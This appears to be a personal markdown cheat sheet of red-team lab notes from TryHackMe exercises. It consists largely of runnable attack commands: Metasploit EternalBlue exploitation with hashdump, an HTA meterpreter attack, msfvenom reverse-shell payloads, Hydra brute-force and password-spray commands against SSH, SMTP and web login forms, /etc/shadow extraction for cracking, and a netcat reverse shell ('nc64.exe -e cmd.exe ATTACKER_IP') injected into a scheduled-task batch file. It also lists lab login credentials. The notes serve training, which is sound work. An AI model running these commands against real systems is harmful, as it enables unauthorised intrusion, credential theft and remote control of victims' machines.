## OSINT

Open source intelligence

## Tools

`whois` to query the WHOIS database
`nslookup`, `dig`, or `host` to query DNS servers

## Search sites

https://www.exploit-db.com/google-hacking-database
Ex Google: intext:"index of" ".sql"

How would you search using Google for xls indexed for http://clinic.thmredteam.com?
filetype:xls site:clinic.thmredteam.com

## Threat Intelligence Platform

Threat Intelligence Platform will launch a series of tests from malware checks to WHOIS and DNS queries.
https://threatintelligenceplatform.com/

## Censys

Censys Search can provide a lot of information about IP addresses and domains.
https://search.censys.io/

## Shodan

Shodan: Passive Reconnaissance
https://www.shodan.io/host/

## Recon-ng
Recon-ng is a framework that helps automate the OSINT work.
Recon-ng is a full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly.
https://github.com/lanmaster53/recon-ng

## Armitage

```
cd /opt/armitage/release/unix
systemctl start postgresql && systemctl status postgresql
```

```
su ubuntu
msfdb --use-defaults delete
msfdb --use-defaults init
exit
```

Start teamserver

```
cd /opt/armitage/release/unix
./teamserver $IPADDR password
```

Start Armitage

```
cd /opt/armitage/release/unix
./armitage
```

https://www.cyb3rm3.com/1ntr0t0c2
https://www.offensive-security.com/metasploit-unleashed/msfvenom/
https://www.hackingarticles.in/msfvenom-tutorials-beginners/
https://medium.com/@jiteshofficial2004/net-sec-challenge-tryhackme-walkthrough-simplest-way-d5a9bb951b90

## MITRE ATT&CK

https://attack.mitre.org/

Exempel
https://attack.mitre.org/groups/G0096/
https://mitre-attack.github.io/attack-navigator//#layerURL=https%3A%2F%2Fattack.mitre.org%2Fgroups%2FG0096%2FG0096-enterprise-layer.json

## LOLBAS

Living off the land refers to the use of dual-use tools, which are either already installed in the victims’ environment, or are admin, forensic or system tools used maliciously.
Living Off The Land Binaries, Scripts and Libraries
The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.
https://lolbas-project.github.io/

## Metasploit

Penetration testing framework
https://www.metasploit.com/
https://www.cyb3rm3.com/1ntr0t0c2

```
msfconsole

msf5 > search eternalblue
msf5 > use 2
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhost $IPADDR
msf5 exploit(windows/smb/ms17_010_eternalblue) > set lport 8888
msf5 exploit(windows/smb/ms17_010_eternalblue) > run
meterpreter > hashdump
meterpreter > pwd
meterpreter > dir
meterpreter > execute -f cmd.exe -c -i
meterpreter > shell
meterpreter > sysinfo
```

### Install latest Metasploit

```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
./msfinstall
dpkg --listfiles metasploit-framework
ln -s -f /opt/metasploit-framework/bin/msfconsole /usr/local/bin/msfconsole
```

### HTA attack

```
msfconsole
set LHOST 10.10.96.223
set LPORT 443
set SRVHOST 10.10.96.223
set payload windows/meterpreter/reverse_tcp
use exploit/windows/misc/hta_server
run
sessions
sessions -i 1
sysinfo
```

## Meterpreter

Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime.
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

## Ubuntu

Version
```
lsb_release -a
```

## Node.js
```
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
sudo apt-get install -y nodejs
```

## Clone this repo

```
git clone https://github.com/tornord/tryhackme.git
```

## Get the IP address

```
IPADDR=$(hostname -I | cut -d' ' -f1)
```

## Venoms

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IPADDR LPORT=443 -f hta-psh -o thm.hta
```

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IPADDR LPORT=443 -f vba -o vba.txt
```

## Connect via RDP

```
xfreerdp /v:10.10.40.39 /u:thm /p:TryHackM3 +clipboard
xfreerdp /v:10.10.40.39 /u:phillip /p:Claire2008 +clipboard
```

## CUPP - Common User Passwords Profiler

```
git clone https://github.com/Mebus/cupp.git
```

## Dictionary attack Hashcat

https://hashcat.net/wiki/doku.php?id=hashcat

```
brew install hashcat
```

E.g.
```
hashcat -a 3 -m 100 8d6e34f987851aa599257d3831a1af040886842f /usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d
```

## Hash ID

```
apt install hashid
```

```
https://github.com/psypanda/hashID
```

## John the Ripper password cracker

KoreLogic's rules in John the Ripper
https://contest-2010.korelogic.com/rules.html

E.g
john --wordlist=words.txt --rules=tornord --stdout 
```
[List.Rules.tornord]
Az"[0-9][0-9]" ^[!@]
```

john --wordlist=words.txt --rules=tornord > passwords.txt
hydra -L usernames-list.txt -P passwords.txt -t 4 ssh://10.10.225.196

Hydra (http://www.thc.org/thc-hydra) starting at 2022-11-05 10:09:23
[DATA] max 4 tasks per 1 server, overall 4 tasks, 180 login tries (l:9/p:20), ~45 tries per task

https://www.cyberciti.biz/faq/unix-linux-password-cracking-john-the-ripper/

Linux/Debian/Ubuntu
```
sudo unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db
john -show /tmp/crack.password.db
```

## CeWL Custom Word List generator

CeWL is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper. Optionally, CeWL can follow external links.

https://digi.ninja/projects/cewl.php
https://github.com/digininja/CeWL
https://www.kali.org/tools/cewl/
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)

E.g.
cewl -w list.txt -d 2 -m 2 http://thm.labs

## Hydra

```
hydra -l pittman@clinic.thmredteam.com -P pwres.txt smtp://10.10.224.93:25 -v
hydra -l phillips -P pwres.txt 10.10.230.190 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 

john --wordlist=clinic.lst --rules=Single-Extra --stdout > pwres.txt
hydra -l burgess -P pwres.txt 10.10.230.190 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```

admin
victim
dummy
adm
sammy
phillips
burgess
pittman
guess

Fall
Autumn
Spring
Sommer
Winter

## Password spray attack

SSH
hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10

RDPassSpray
https://github.com/xFreed0m/RDPassSpray

python3 -m pip install -r requirements.txt

```
python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
```

## Network Enumeration

netstat
netstat -na
arp -a

## Linux system check

```
ls -l /etc/*-release
cat /etc/os-release
hostname
cat /etc/passwd
cat /etc/group
sudo cat /etc/shadow
ls -lh /var/mail/
```

## DNS Lookup

```
dig -t AXFR redteam.thm @10.10.113.132
```

## Simple Network Management Protocol (SNMP)

```
git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
cd snmpcheck/
gem install snmp
chmod +x snmpcheck-1.9.rb
```

## Netcat

https://eternallybored.org/misc/netcat/
https://github.com/int0x33/nc.exe/

## Windows Privilege Escalation

https://benheater.com/thm-windows-privesc/

## Manipulate scheduled task

Check which user runs the scheduled task:
```
C:\> schtasks /query /tn vulntask /fo list /v
Folder: \
HostName:                             THM-PC1
TaskName:                             \vulntask
Task To Run:                          C:\tasks\schtask.bat
Run As User:                          taskusr1
```

Check if current user can change the bat file
```
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

Inject netcat in the bat file
```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Start listening on the attack machine
```
nc -lvp 4444
```

Rerun the task
```
schtasks /run /tn vulntask
```
